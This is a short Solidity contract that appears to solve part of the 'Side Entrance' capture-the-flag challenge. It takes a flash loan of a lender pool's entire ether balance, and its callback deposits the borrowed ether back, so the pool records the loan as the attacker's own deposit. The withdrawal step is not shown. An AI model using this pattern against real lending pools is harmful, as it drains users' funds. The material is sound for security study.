 // SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool{
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;
}

contract flashLoanEtherReceiver {
    ISideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    function execute() external payable{
       pool.deposit{value: msg.value}();
    } 

    function getLoan() external {
        pool.flashLoan(address(pool).balance);
    }
}